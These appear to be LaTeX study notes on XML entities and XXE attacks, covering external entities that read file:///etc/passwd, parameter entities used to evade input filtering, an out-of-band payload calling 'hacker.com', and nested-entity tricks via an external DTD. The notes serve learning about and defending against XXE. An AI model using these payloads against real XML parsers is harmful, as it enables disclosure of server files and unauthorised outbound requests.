
\section{Entity}
entity can be  considered as variable and store data. They allow refactoring of
variables and reduce repetitive data. They are defined in \verb+DTD+

\subsection{External}

{\bf External} entities are entities which values are external ressource (local or
remote). The keyword \verb+SYSTEM+ allow to define an external entities for
which the value  can be : 
\begin{itemize}
    \item a file: \verb+file:///etc/passwd+
    \item an external URL: \verb+ "http://..."+, \verb+ftp://...+,\ldots
\end{itemize}

\textbf{\underline{Note}}: if the external ressource is close to an xml syntax
the XML parser will trhow an error if not properly managed (\verb+CDATA+)

\subsection{General entity}

\subsubsection{declaration}
\begin{verbatim}
<?xml version = "1.0"?>
<!DOCTYPE foo [
    <!ENTITY ress SYSTEM "value"> 
    <!ENTITY name "value">+
]>
\end{verbatim}

\subsubsection{reference}

\begin{verbatim}
<sometag>some text +&name; continuing</sometag>
\end{verbatim}

\subsection{Predefined entity}
As General entities 

\subsection{Parameter entity}
Sometimes, XXE attacks using regular entities are blocked, due to some input
validation by the application or some hardening of the XML parser that is being
used. In this situation, you might be able to use XML parameter entities
instead. XML parameter entities are a special kind of XML entity which can only
be referenced within the DTD. 

\subsubsection{declaration}
\begin{verbatim}
<!DOCTYPE evil [
    <!ENTITY % param "value">
]>
\end{verbatim}

\subsubsection{reference}
\begin{verbatim}
<!DOCTYPE evil [
    <!ENTITY % param "value">
    %param;
]>
\end{verbatim}

example of use which will cause a DNS lookup and HTTP request to the attacker's
domain, .
\begin{verbatim}
<!DOCTYPE evil [
    <!ENTITY % xxe SYSTEM "http://hacker.com">
    %xxe;
]>
\end{verbatim}

\subsubsection{Nested reference}
According to the standard: in an internal DTD subset, parameter-entity
references MUST NOT occur within markup declaration.

Therefore this will work:
\begin{verbatim}
<?xml version = "1.0"?>
<!DOCTYPE evil [
    <!ENTITY % param "<!ENTITY  general 'pwned'>">
    %param;
]>
<pwn>&general;</pwn>
\end{verbatim}

But this will not work (illegal parameter entity reference):

\begin{verbatim}
<?xml version = "1.0"?>
<!DOCTYPE evil [
    <!ENTITY % ext1 "ext1">
    <!ENTITY % outer "<!ENTITY inner 'value of ext1 is %ext1;'>">
    %outer;
]>
<pwn>&inner;</pwn>
\end{verbatim}

The solution to solve this is  to use and external DTD:
\begin{verbatim}
<?xml version = "1.0"?>
<!DOCTYPE evil SYSTEM "URI">
<pwn>&inner;</pwn>
\end{verbatim}

And inside evil.dtd
\begin{verbatim}
<!ENTITY % ext1 "ext1">
<!ENTITY % outer "<!ENTITY inner 'value of ext1 is %ext1;'>">
%outer;
\end{verbatim}
